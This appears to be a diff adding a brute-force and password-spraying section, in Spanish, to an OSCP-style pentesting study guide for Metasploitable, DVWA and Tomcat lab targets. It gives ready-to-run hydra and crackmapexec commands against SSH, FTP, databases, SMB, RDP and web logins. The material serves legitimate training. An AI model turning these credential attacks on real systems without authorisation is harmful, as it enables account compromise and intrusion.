@@ -141,6 +141,37 @@ flowchart LR
    - **DNS (53):**
      - Transferencia de zona: `dig axfr @<IP> <DOMINIO>`
 
+3. **Ataques de Fuerza Bruta Dirigida y Password Spraying (Metasploitable 2 & 3):**
+   *La fuerza bruta en servicios de red es un vector canónico del OSCP cuando no existen vulnerabilidades de desbordamiento de búfer o RCE directo:*
+   - **SSH (22/tcp - Metasploitable 2):**
+     ```bash
+     hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt 192.168.1.154 ssh -t 4
+     ```
+   - **FTP (21/tcp - Metasploitable 2 / Windows):**
+     ```bash
+     hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.154 ftp -s 21 -V
+     ```
+   - **Bases de Datos (MySQL 3306 / PostgreSQL 5432):**
+     ```bash
+     hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.154 mysql
+     ```
+   - **SMB y RDP (445 y 3389 - Metasploitable 3 Windows):**
+     ```bash
+     # Fuerza bruta a SMB con Hydra:
+     hydra -l vagrant -P wordlist.txt 192.168.1.155 smb
+     # Password spraying con CrackMapExec:
+     crackmapexec smb 192.168.1.155 -u users.txt -p 'Vagrant2008!' --continue-on-success
+     # Fuerza bruta a RDP:
+     hydra -l vagrant -P wordlist.txt rdp://192.168.1.155
+     ```
+   - **Formularios Web HTTP (DVWA & Tomcat Manager 8180):**
+     ```bash
+     # Tomcat Manager (Autenticación HTTP Basic):
+     hydra -L users.txt -P passwords.txt 192.168.1.154 http-get /manager/html
+     # DVWA (Formulario HTTP GET con cookie de sesión):
+     hydra -l admin -P passwords.txt 192.168.1.147 http-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=xxx; security=low:F=incorrect"
+     ```
+
 ---
 
 ### Nivel 3: Vectores Web y Fuzzing Dirigido (Voltaje Alto 🔴)
